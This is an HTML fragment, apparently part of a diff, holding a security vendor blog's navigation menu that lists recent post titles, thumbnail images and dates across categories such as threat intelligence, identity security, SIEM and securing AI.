+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Scattered-Spider?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Inside Astaroth&#39;s New Spambot Component"/>
+                                            </div>
+                                            <div class="title">Inside Astaroth&#39;s New Spambot Component</div>
+                                        </a>
+                                        <div class="date">07/29/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-2026-technology-threat-landscape-report/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-TechThreatReport?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike 2026 Technology Threat Landscape Report: China’s Ambitions Fuel Attacks "/>
+                                            </div>
+                                            <div class="title">CrowdStrike 2026 Technology Threat Landscape Report: China’s Ambitions Fuel Attacks </div>
+                                        </a>
+                                        <div class="date">06/09/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/inside-crowdstrike-takedown-of-a-developer-targeting-botnet/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/CS_Blog-Update_02-1?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Disrupting Glassworm: Inside CrowdStrike’s Takedown of a Developer-Targeting Botnet"/>
+                                            </div>
+                                            <div class="title">Disrupting Glassworm: Inside CrowdStrike’s Takedown of a Developer-Targeting Botnet</div>
+                                        </a>
+                                        <div class="date">05/26/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element endpoint-protection ">
+                            <a href="/en-us/blog/category.endpoint-protection/">
+                                <div class="title">Endpoint Security &amp; XDR</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container endpoint-protection">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/Endpoint-Security-And-XDR.svg"/>
+                                    <dt class="d-flex align-items-center endpoint-protection">Endpoint Security &amp; XDR
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/falcon-secure-access-sets-standard-for-zero-trust-security-browser/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Falcon-Browser?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Secure Access Sets the Standard for Zero Trust Browser Security"/>
+                                            </div>
+                                            <div class="title">Falcon Secure Access Sets the Standard for Zero Trust Browser Security</div>
+                                        </a>
+                                        <div class="date">07/08/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/browser-security-zero-days-are-only-part-of-the-problem/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Zero-Days?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Browser Security: Zero-Days Are Only Part of the Problem "/>
+                                            </div>
+                                            <div class="title">Browser Security: Zero-Days Are Only Part of the Problem </div>
+                                        </a>
+                                        <div class="date">06/30/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/new-abuse-of-the-clickonce-technology-part-two/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-ClickOnce-2?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="New Abuse of the ClickOnce Technology, Part 2: Stop Threat Actors from Clicking Once and Staying Forever"/>
+                                            </div>
+                                            <div class="title">New Abuse of the ClickOnce Technology, Part 2: Stop Threat Actors from Clicking Once and Staying Forever</div>
+                                        </a>
+                                        <div class="date">06/18/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/new-abuse-of-the-clickonce-technology-part-one/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-ClickOnce-1?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="New Abuse of the ClickOnce Technology, Part 1: The Inner Workings of ClickOnce Application Deployment"/>
+                                            </div>
+                                            <div class="title">New Abuse of the ClickOnce Technology, Part 1: The Inner Workings of ClickOnce Application Deployment</div>
+                                        </a>
+                                        <div class="date">06/18/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element engineering-and-technology ">
+                            <a href="/en-us/blog/category.engineering-and-technology/">
+                                <div class="title">Engineering &amp; Tech</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container engineering-and-technology">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Engineering-and-Tech.svg"/>
+                                    <dt class="d-flex align-items-center engineering-and-technology">Engineering &amp; Tech
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/ember-2024-advancing-cybersecurity-ml-training-on-evasive-malware/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-EMBER2024?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware"/>
+                                            </div>
+                                            <div class="title">EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware</div>
+                                        </a>
+                                        <div class="date">09/03/25 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/falcon-prevents-cookie-spider-shamos-delivery-macos/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-COOKIESPIDER?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Platform Prevents COOKIE SPIDER’s SHAMOS Delivery on macOS"/>
+                                            </div>
+                                            <div class="title">Falcon Platform Prevents COOKIE SPIDER’s SHAMOS Delivery on macOS</div>
+                                        </a>
+                                        <div class="date">08/20/25 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/machine-learning-evaluation-using-data-splitting/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-DataSplitting-4?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike’s Approach to Better Machine Learning Evaluation Using Strategic Data Splitting"/>
+                                            </div>
+                                            <div class="title">CrowdStrike’s Approach to Better Machine Learning Evaluation Using Strategic Data Splitting</div>
+                                        </a>
+                                        <div class="date">08/11/25 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-researchers-develop-custom-xgboost-objective/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-XGBoost?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Researchers Develop Custom XGBoost Objective to Improve ML Model Release Stability"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Researchers Develop Custom XGBoost Objective to Improve ML Model Release Stability</div>
+                                        </a>
+                                        <div class="date">03/20/25 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element executive-viewpoint ">
+                            <a href="/en-us/blog/category.executive-viewpoint/">
+                                <div class="title">Executive Viewpoint</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container executive-viewpoint">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Exec-Viewpoint.svg"/>
+                                    <dt class="d-flex align-items-center executive-viewpoint">Executive Viewpoint
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/harnessing-frontier-ai-for-stronger-defense/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-DeepSeek?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Beyond the Model: Harnessing Frontier AI for Stronger Cyber Defense"/>
+                                            </div>
+                                            <div class="title">Beyond the Model: Harnessing Frontier AI for Stronger Cyber Defense</div>
+                                        </a>
+                                        <div class="date">07/20/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/frontier-ai-collapses-exploit-window-how-defenders-must-respond/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-DeepSeek?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Frontier AI Is Collapsing the Exploit Window. Here’s How Defenders Must Respond."/>
+                                            </div>
+                                            <div class="title">Frontier AI Is Collapsing the Exploit Window. Here’s How Defenders Must Respond.</div>
+                                        </a>
+                                        <div class="date">04/20/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/frontier-ai-for-defenders-crowdstrike-and-openai-tac/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Shield-AI?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Frontier AI for Defenders: CrowdStrike and OpenAI TAC"/>
+                                            </div>
+                                            <div class="title">Frontier AI for Defenders: CrowdStrike and OpenAI TAC</div>
+                                        </a>
+                                        <div class="date">04/16/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-founding-member-anthropic-mythos-frontier-model-to-secure-ai/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Architecture-of-Agentic-Defense?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Anthropic Claude Mythos Preview: The More Capable AI Becomes, the More Security It Needs"/>
+                                            </div>
+                                            <div class="title">Anthropic Claude Mythos Preview: The More Capable AI Becomes, the More Security It Needs</div>
+                                        </a>
+                                        <div class="date">04/06/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element from-the-front-lines ">
+                            <a href="/en-us/blog/category.from-the-front-lines/">
+                                <div class="title">From The Front Lines</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container from-the-front-lines">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Front-Lines.svg"/>
+                                    <dt class="d-flex align-items-center from-the-front-lines">From The Front Lines
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-technical-risk-assessments-reveal-common-exposure-patterns/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel%20(1)?wid=2048&hei=1350&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Technical Risk Assessments Reveal Common Exposure Patterns "/>
+                                            </div>
+                                            <div class="title">CrowdStrike Technical Risk Assessments Reveal Common Exposure Patterns </div>
+                                        </a>
+                                        <div class="date">05/04/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-shadow-AI-visibility-service/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-ShadowAI?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Introducing the CrowdStrike Shadow AI Visibility Service"/>
+                                            </div>
+                                            <div class="title">Introducing the CrowdStrike Shadow AI Visibility Service</div>
+                                        </a>
+                                        <div class="date">04/21/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-extends-the-falcon-flex-model-to-services/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Flex-Services?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Flex for Services Expands Access to Elite Security Expertise"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Flex for Services Expands Access to Elite Security Expertise</div>
+                                        </a>
+                                        <div class="date">03/24/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/from-scanner-to-stealer-inside-the-trivy-action-supply-chain-compromise/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-NPM-SupplyChain?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="From Scanner to Stealer: Inside the trivy-action Supply Chain Compromise"/>
+                                            </div>
+                                            <div class="title">From Scanner to Stealer: Inside the trivy-action Supply Chain Compromise</div>
+                                        </a>
+                                        <div class="date">03/20/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element identity-protection ">
+                            <a href="/en-us/blog/category.identity-protection/">
+                                <div class="title">Next-Gen Identity Security</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container identity-protection">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/Identity-Protection.svg"/>
+                                    <dt class="d-flex align-items-center identity-protection">Next-Gen Identity Security
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/the-identity-problem-hiding-in-ai-agent-deployments/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Agentic-Identity?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="The Identity Problem Hiding in AI Agent Deployments "/>
+                                            </div>
+                                            <div class="title">The Identity Problem Hiding in AI Agent Deployments </div>
+                                        </a>
+                                        <div class="date">06/24/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-announces-continuous-identity-for-ai-agents/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Continuous-Identity?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Announces Continuous Identity for AI Agents"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Announces Continuous Identity for AI Agents</div>
+                                        </a>
+                                        <div class="date">06/15/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-expands-identity-leadership-with-openid-and-idpro/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Identity-Leadership?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Expands Identity Leadership with OpenID and IDPro"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Expands Identity Leadership with OpenID and IDPro</div>
+                                        </a>
+                                        <div class="date">06/10/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-zscaler-bring-continuous-identity-security-to-zero-trust-access/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Lock?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike and Zscaler Bring Continuous Identity to Zero Trust Access"/>
+                                            </div>
+                                            <div class="title">CrowdStrike and Zscaler Bring Continuous Identity to Zero Trust Access</div>
+                                        </a>
+                                        <div class="date">06/08/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element observability-and-log-management ">
+                            <a href="/en-us/blog/category.observability-and-log-management/">
+                                <div class="title">Next-Gen SIEM &amp; Log Management</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container observability-and-log-management">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Next-Gen-SIEM-LOG-Management.svg"/>
+                                    <dt class="d-flex align-items-center observability-and-log-management">Next-Gen SIEM &amp; Log Management
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-hunts-for-shell-command-obfuscation-vmware-esx/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-EMBER2024?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Threat Hunts for Shell Command Obfuscation on VMware ESX"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Threat Hunts for Shell Command Obfuscation on VMware ESX</div>
+                                        </a>
+                                        <div class="date">08/07/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/falcon-platform-ioas-arrive-in-falcon-next-gen-siem/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalconPlatformIOA?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Platform IOAs Arrive in Falcon Next-Gen SIEM to Identify New Threats"/>
+                                            </div>
+                                            <div class="title">Falcon Platform IOAs Arrive in Falcon Next-Gen SIEM to Identify New Threats</div>
+                                        </a>
+                                        <div class="date">07/29/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/five-high-impact-use-cases-for-falcon-onum/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Onum-Lines?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="5 High-Impact Use Cases for Falcon Onum"/>
+                                            </div>
+                                            <div class="title">5 High-Impact Use Cases for Falcon Onum</div>
+                                        </a>
+                                        <div class="date">07/27/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/falcon-next-gen-siem-supports-third-party-edr-tools-starting-with-microsoft-defender/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-NGS-Exponential?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Next-Gen SIEM Supports Third-Party EDR Tools, Starting with Microsoft Defender"/>
+                                            </div>
+                                            <div class="title">Falcon Next-Gen SIEM Supports Third-Party EDR Tools, Starting with Microsoft Defender</div>
+                                        </a>
+                                        <div class="date">03/23/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element public-sector ">
+                            <a href="/en-us/blog/category.public-sector/">
+                                <div class="title">Public Sector</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container public-sector">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blogicon-test-4.png"/>
+                                    <dt class="d-flex align-items-center public-sector">Public Sector
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-falcon-platform-helps-meet-us-government-mandates-cisa-bod-26-04/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Gov-Scroll?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Falcon Platform Helps Meet U.S. Government Mandates for CISA BOD-26-04 "/>
+                                            </div>
+                                            <div class="title">CrowdStrike Falcon Platform Helps Meet U.S. Government Mandates for CISA BOD-26-04 </div>
+                                        </a>
+                                        <div class="date">07/22/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-innovates-to-modernize-national-security-and-protect-critical-systems/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalConGov-Roundup?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Innovates to Modernize National Security and Protect Critical Systems "/>
+                                            </div>
+                                            <div class="title">CrowdStrike Innovates to Modernize National Security and Protect Critical Systems </div>
+                                        </a>
+                                        <div class="date">03/18/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/falcon-platform-for-government-now-offers-falcon-for-xiot-to-secure-connected-assets/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalConGov-XIoT?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Platform for Government Now Offers Falcon for XIoT to Secure Connected Assets "/>
+                                            </div>
+                                            <div class="title">Falcon Platform for Government Now Offers Falcon for XIoT to Secure Connected Assets </div>
+                                        </a>
+                                        <div class="date">03/18/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-achieves-fedramp-high-authorization/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-image-for-Fed-Gov-1?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Achieves FedRAMP® High Authorization"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Achieves FedRAMP® High Authorization</div>
+                                        </a>
+                                        <div class="date">03/19/25 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element exposure-management ">
+                            <a href="/en-us/blog/category.exposure-management/">
+                                <div class="title">Exposure Management</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container exposure-management">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/BlogIcon-test-image-2.svg"/>
+                                    <dt class="d-flex align-items-center exposure-management">Exposure Management
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/patch-tuesday-analysis-july-2026/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-PT-2025?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="July 2026 Patch Tuesday: Microsoft Patches 622 Vulnerabilities Including Two Exploited Zero-Days"/>
+                                            </div>
+                                            <div class="title">July 2026 Patch Tuesday: Microsoft Patches 622 Vulnerabilities Including Two Exploited Zero-Days</div>
+                                        </a>
+                                        <div class="date">07/14/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/falcon-exposure-management-now-available-for-third-party-environments/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-MagnifyingGlass?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Exposure Management Now Available for Third-Party Environments"/>
+                                            </div>
+                                            <div class="title">Falcon Exposure Management Now Available for Third-Party Environments</div>
+                                        </a>
+                                        <div class="date">06/16/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/patch-tuesday-analysis-june-2026/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-PT-2025?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="June 2026 Patch Tuesday: Microsoft Patches 206 Vulnerabilities Including Three Publicly Disclosed Zero-Days "/>
+                                            </div>
+                                            <div class="title">June 2026 Patch Tuesday: Microsoft Patches 206 Vulnerabilities Including Three Publicly Disclosed Zero-Days </div>
+                                        </a>
+                                        <div class="date">06/09/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/patch-tuesday-analysis-may-2026/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-PT-2025?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="May 2026 Patch Tuesday: 30 Critical Vulnerabilities Among 130 CVEs"/>
+                                            </div>
+                                            <div class="title">May 2026 Patch Tuesday: 30 Critical Vulnerabilities Among 130 CVEs</div>
+                                        </a>
+                                        <div class="date">05/12/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element securing-ai ">
+                            <a href="/en-us/blog/category.securing-ai/">
+                                <div class="title">Securing AI</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container securing-ai">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blogicon-test-3.svg"/>
+                                    <dt class="d-flex align-items-center securing-ai">Securing AI
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/expanding-cybersecurity-ai-benchmarks-beyond-vulnerability-discovery/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel%20(1)?wid=2048&hei=1350&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Expanding AI Benchmarks in Cybersecurity Beyond Vulnerability Discovery"/>
+                                            </div>
+                                            <div class="title">Expanding AI Benchmarks in Cybersecurity Beyond Vulnerability Discovery</div>
+                                        </a>
+                                        <div class="date">08/06/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/secure-agent-harness-execution-preventing-escape/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-TrainingGenAI?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Secure Agent Harness Execution: Preventing Escape"/>
+                                            </div>
+                                            <div class="title">Secure Agent Harness Execution: Preventing Escape</div>
+                                        </a>
+                                        <div class="date">08/04/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/falcon-aidr-protects-copilot-studio-agents-and-claude-code/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-AIDR-Protection?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon AIDR Now Protects Copilot Studio Agents and Claude Code"/>
+                                            </div>
+                                            <div class="title">Falcon AIDR Now Protects Copilot Studio Agents and Claude Code</div>
+                                        </a>
+                                        <div class="date">07/30/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-joins-the-open-secure-ai-alliance/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-AWS-NVIDIA?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Joins the Open Secure AI Alliance to Advance AI Safety and Security"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Joins the Open Secure AI Alliance to Advance AI Safety and Security</div>
+                                        </a>
+                                        <div class="date">07/27/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element data-security ">
+                            <a href="/en-us/blog/category.data-security/">
+                                <div class="title">Data Security</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container data-security">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/data-protection-red.svg"/>
+                                    <dt class="d-flex align-items-center data-security">Data Security
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/iso-42001-2023-and-new-reality-of-cloud-ai-data-risk/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Data-Protection-Day-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="ISO 42001:2023 and the New Reality of Cloud AI Data Risk"/>
+                                            </div>
+                                            <div class="title">ISO 42001:2023 and the New Reality of Cloud AI Data Risk</div>
+                                        </a>
+                                        <div class="date">06/04/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/falcon-data-security-secures-data-wherever-it-lives-and-moves/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Strengthen-Data-Security?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Data Security Secures Data Wherever It Lives and Moves"/>
+                                            </div>
+                                            <div class="title">Falcon Data Security Secures Data Wherever It Lives and Moves</div>
+                                        </a>
+                                        <div class="date">03/24/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalconDataProtectionCloud?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Data Protection for Cloud Extends DSPM into Runtime"/>
+                                            </div>
+                                            <div class="title">Falcon Data Protection for Cloud Extends DSPM into Runtime</div>
+                                        </a>
